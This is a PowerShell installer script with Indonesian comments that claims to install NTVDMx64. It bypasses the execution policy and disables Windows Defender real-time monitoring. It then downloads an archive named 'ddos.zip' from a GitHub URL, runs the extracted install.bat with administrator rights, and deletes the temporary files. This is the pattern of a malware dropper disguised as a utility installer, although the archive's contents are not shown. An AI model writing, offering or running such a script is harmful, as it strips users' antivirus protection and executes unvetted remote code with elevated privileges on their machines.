# install.ps1

# Izinkan eksekusi skrip
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Bypass Windows Defender
if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
}

# Tentukan direktori temp
$TempDir = "$env:TEMP\ntvdm_ddos"
$ZipFile = "$TempDir\ddos.zip"
$ExtractDir = "$TempDir\extract"

# Hapus sisa file lama jika ada
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }

# Buat folder temp
New-Item -Path $TempDir -ItemType Directory -Force | Out-Null

# Unduh file ZIP
Write-Host "Mengunduh ddos.zip..." -ForegroundColor Green
$URL = "https://github.com/cvs5758/ddos/raw/main/ddos.zip "

try {
    Invoke-WebRequest -Uri $URL -OutFile $ZipFile -ErrorAction Stop
} catch {
    Write-Host "Gagal mengunduh file: $_" -ForegroundColor Red
    exit
}

# Verifikasi apakah file ZIP berhasil diunduh
if (-not (Test-Path $ZipFile)) {
    Write-Host "File ZIP tidak ditemukan di server!" -ForegroundColor Red
    exit
}

# Verifikasi apakah file ZIP valid
try {
    Write-Host "Memverifikasi file ZIP..." -ForegroundColor Green
    [System.IO.Compression.ZipFile]::OpenRead($ZipFile).Dispose()
} catch {
    Write-Host "File ZIP rusak atau tidak valid!" -ForegroundColor Red
    exit
}

# Buat folder ekstraksi
New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null

# Mengekstrak file ZIP (metode yang lebih stabil)
Write-Host "Mengekstrak file ZIP..." -ForegroundColor Green
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $ExtractDir)

# Pindahkan semua file dari folder extract ke root temp
Get-ChildItem -Path $ExtractDir\* -Recurse | Move-Item -Destination $TempDir

# Hapus folder extract setelah selesai
Remove-Item $ExtractDir -Recurse -Force

# Verifikasi apakah install.bat ada
$InstallBat = "$TempDir\install.bat"
if (-not (Test-Path $InstallBat)) {
    Write-Host "File install.bat tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
    exit
}

# Jalankan install.bat sebagai admin
Write-Host "Menjalankan instalasi NTVDMx64..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-Command `"$InstallBat`"" -Verb RunAs -Wait

# Hapus folder sementara
Remove-Item $TempDir -Recurse -Force

Write-Host "Instalasi selesai!" -ForegroundColor Green
